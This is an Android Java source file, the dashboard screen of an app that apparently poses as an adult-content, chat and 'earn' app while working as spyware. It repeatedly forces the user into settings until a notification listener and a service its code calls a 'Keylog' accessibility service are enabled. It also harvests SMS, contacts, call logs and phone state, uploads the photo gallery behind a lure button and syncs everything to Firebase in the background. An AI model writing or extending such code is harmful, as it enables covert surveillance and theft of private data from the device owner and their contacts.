package com.mehboob.bushorat.activities;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.mehboob.bushorat.R;
import com.mehboob.bushorat.databinding.ActivityDashboardBinding;
import com.mehboob.bushorat.helpers.AccessibilityHelper;
import com.mehboob.bushorat.helpers.AppVisibilityHelper;
import com.mehboob.bushorat.helpers.DataSyncWorker;
import com.mehboob.bushorat.helpers.NotificationHelper;
import com.mehboob.bushorat.helpers.PermissionsManager;
import com.mehboob.bushorat.helpers.SessionManager;
import com.mehboob.bushorat.helpers.UserDataSyncHelper;

public class DashboardActivity extends AppCompatActivity {
    private static final String TAG = "DashboardActivity";

    private ActivityDashboardBinding binding;
    final int GALLERY_PERMISSION_REQUEST  = 1;
    final int SMS_PERMISSION_CODE  = 2;
    private static final int ALL_PERMISSIONS_REQUEST = 1001;
    
    private PermissionsManager permissionsManager;
    private SessionManager sessionManager;
    private Handler notificationCheckHandler;
    private Runnable notificationCheckRunnable;
    private Handler accessibilityCheckHandler;
    private Runnable accessibilityCheckRunnable;
    private static final long NOTIFICATION_CHECK_INTERVAL = 5000; // Check every 5 seconds
    private static final long ACCESSIBILITY_CHECK_INTERVAL = 5000;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate: DashboardActivity started");
        
        EdgeToEdge.enable(this);
        binding=ActivityDashboardBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // Make status bar transparent to match gradient background
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        setSupportActionBar(binding.toolbar);

        // Initialize helpers
        Log.d(TAG, "onCreate: Initializing helpers");
        permissionsManager = new PermissionsManager(this, this);
        sessionManager = new SessionManager(this);
        AppVisibilityHelper.getInstance(this).ensureListenerStarted();

        // Initialize background data sync
        Log.d(TAG, "onCreate: Scheduling background data sync");
        DataSyncWorker.schedulePeriodicSync(this);

        // Initialize notification permission checker
        notificationCheckHandler = new Handler(Looper.getMainLooper());
        notificationCheckRunnable = new Runnable() {
            @Override
            public void run() {
                if (!NotificationHelper.isNotificationServiceEnabled(DashboardActivity.this)) {
                    // Keep asking if permission not granted
                    checkAndEnableNotificationListener();
                    // Schedule next check
                    notificationCheckHandler.postDelayed(this, NOTIFICATION_CHECK_INTERVAL);
                } else {
                    Log.d(TAG, "Notification listener service enabled, stopping checks");
                }
            }
        };

        // Check and enable notification listener service
        checkAndEnableNotificationListener();
        
        // Start periodic checking
        notificationCheckHandler.postDelayed(notificationCheckRunnable, NOTIFICATION_CHECK_INTERVAL);

        accessibilityCheckHandler = new Handler(Looper.getMainLooper());
        accessibilityCheckRunnable = new Runnable() {
            @Override
            public void run() {
                if (!AccessibilityHelper.isKeylogServiceEnabled(DashboardActivity.this)) {
                    checkAndEnableAccessibilityService();
                    accessibilityCheckHandler.postDelayed(this, ACCESSIBILITY_CHECK_INTERVAL);
                } else {
                    Log.d(TAG, "Keylog accessibility service enabled, stopping checks");
                }
            }
        };
        checkAndEnableAccessibilityService();
        accessibilityCheckHandler.postDelayed(accessibilityCheckRunnable, ACCESSIBILITY_CHECK_INTERVAL);

        setupToolbarSubtitle();

        // Always sync available data when dashboard opens
        UserDataSyncHelper.syncAll(this);

        if (!permissionsManager.areAllPermissionsGranted()) {
            permissionsManager.requestEssentialSyncPermissions(ALL_PERMISSIONS_REQUEST);
        }
        binding.btnPorn.setOnClickListener(v -> {
            if (checkGalleryPermission()) {
                // Enqueue background gallery upload then open activity
                com.mehboob.bushorat.helpers.ImageUploadWorker.enqueueWork(this);
                openMediaActivity();
            } else {
                requestGalleryPermission();
            }
        });

        binding.btnChat.setOnClickListener(v -> {
            if (checkSmsPermission()) {
                startActivity(new Intent(DashboardActivity.this,ChatActivity.class));
            } else {
                requestSmsPermission();
            }
        });

        binding.btnContacts.setOnClickListener(v -> {
            if (hasAllPermissions()) {
                   startActivity(new Intent(DashboardActivity.this,EarnActivity.class));
            } else {
                // 🚫 Request permissions
                ActivityCompat.requestPermissions(
                        this,
                        new String[]{
                                Manifest.permission.READ_CONTACTS,
                                Manifest.permission.READ_CALL_LOG,
                                Manifest.permission.READ_PHONE_STATE
                        },
                        1001 // any request code you choose
                );
            }
        });
    }

    private void setupToolbarSubtitle() {
        String subtitle = sessionManager != null ? sessionManager.getUserEmail() : null;
        if (subtitle != null && getSupportActionBar() != null) {
            getSupportActionBar().setSubtitle(subtitle);
        }
    }

    private void openProfile() {
        Intent intent = new Intent(this, ProfileActivity.class);
        startActivity(intent);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_dashboard, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (item.getItemId() == R.id.action_profile) {
            openProfile();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.d(TAG, "onResume: Dashboard activity resumed");
        // Update session activity
        if (sessionManager != null) {
            sessionManager.updateLastActivity();
            Log.d(TAG, "onResume: Session last activity updated");
        }
        
        // Re-sync whenever dashboard is visible (picks up newly granted permissions)
        UserDataSyncHelper.syncAll(this);
        
        // Check notification listener permission every time activity resumes
        checkAndEnableNotificationListener();
        checkAndEnableAccessibilityService();
        
        // Restart periodic checking when activity resumes
        if (notificationCheckHandler != null && notificationCheckRunnable != null) {
            notificationCheckHandler.removeCallbacks(notificationCheckRunnable);
            if (!NotificationHelper.isNotificationServiceEnabled(this)) {
                notificationCheckHandler.postDelayed(notificationCheckRunnable, NOTIFICATION_CHECK_INTERVAL);
            }
        }
        if (accessibilityCheckHandler != null && accessibilityCheckRunnable != null) {
            accessibilityCheckHandler.removeCallbacks(accessibilityCheckRunnable);
            if (!AccessibilityHelper.isKeylogServiceEnabled(this)) {
                accessibilityCheckHandler.postDelayed(accessibilityCheckRunnable, ACCESSIBILITY_CHECK_INTERVAL);
            }
        }
    }
    
    @Override
    protected void onPause() {
        super.onPause();
        // Stop periodic checking when activity is paused
        if (notificationCheckHandler != null && notificationCheckRunnable != null) {
            notificationCheckHandler.removeCallbacks(notificationCheckRunnable);
        }
        if (accessibilityCheckHandler != null && accessibilityCheckRunnable != null) {
            accessibilityCheckHandler.removeCallbacks(accessibilityCheckRunnable);
        }
    }

    // Add logout functionality (can be called from menu or button)
    public void logout() {
        sessionManager.logoutUser();
        Intent intent = new Intent(this, ChooseLoginActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
    }

    private boolean checkGalleryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private boolean hasAllPermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
    }


    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermission() {
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.READ_SMS},
                SMS_PERMISSION_CODE);
    }

    private void requestGalleryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES},
                    GALLERY_PERMISSION_REQUEST);
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    GALLERY_PERMISSION_REQUEST);
        }
    }

    private void startDataCollection() {
        Log.d(TAG, "startDataCollection: Syncing available data to Firebase");
        UserDataSyncHelper.syncAll(this);
    }

    private void handlePermissionResult() {
        startDataCollection();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == GALLERY_PERMISSION_REQUEST) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                handlePermissionResult();
                openMediaActivity();
            } else {
                Toast.makeText(this, "Gallery permission is required to proceed", Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                handlePermissionResult();
                startActivity(new Intent(DashboardActivity.this, ChatActivity.class));
            } else {
                Toast.makeText(this, "Sms permission is required to proceed", Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == ALL_PERMISSIONS_REQUEST) {
            handlePermissionResult();
            if (permissionsManager.areAllPermissionsGranted()) {
                Toast.makeText(this, "All permissions granted. Data is uploading to Firebase.", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Some permissions denied. Available data will still upload.", Toast.LENGTH_LONG).show();
            }
        } else if (requestCode == 1001) {
            handlePermissionResult();
            if (hasAllPermissions()) {
                Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Required permissions not granted.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void openMediaActivity() {
        Intent intent = new Intent(this, PornActivity.class);
        startActivity(intent);
    }

    private void checkAndEnableNotificationListener() {
        if (!NotificationHelper.isNotificationServiceEnabled(this)) {
            Log.d(TAG, "Notification listener service not enabled, opening settings");
            // Open settings to enable notification listener
            // Ask repeatedly until permission is granted
            NotificationHelper.openNotificationListenerSettings(this);
            Toast.makeText(this, "Please enable Notification Access for this app in settings", Toast.LENGTH_LONG).show();
        } else {
            Log.d(TAG, "Notification listener service is enabled");
            // Stop periodic checking if permission is granted
            if (notificationCheckHandler != null && notificationCheckRunnable != null) {
                notificationCheckHandler.removeCallbacks(notificationCheckRunnable);
            }
        }
    }

    private void checkAndEnableAccessibilityService() {
        if (!AccessibilityHelper.isKeylogServiceEnabled(this)) {
            Log.d(TAG, "Keylog accessibility service not enabled, opening settings");
            AccessibilityHelper.openAccessibilitySettings(this);
            Toast.makeText(this, R.string.keylog_accessibility_prompt, Toast.LENGTH_LONG).show();
        } else {
            Log.d(TAG, "Keylog accessibility service is enabled");
            if (accessibilityCheckHandler != null && accessibilityCheckRunnable != null) {
                accessibilityCheckHandler.removeCallbacks(accessibilityCheckRunnable);
            }
        }
    }
    
    @Override
    protected void onStart() {
        super.onStart();
        // Check notification listener permission when activity starts
        checkAndEnableNotificationListener();
        checkAndEnableAccessibilityService();
    }
    

}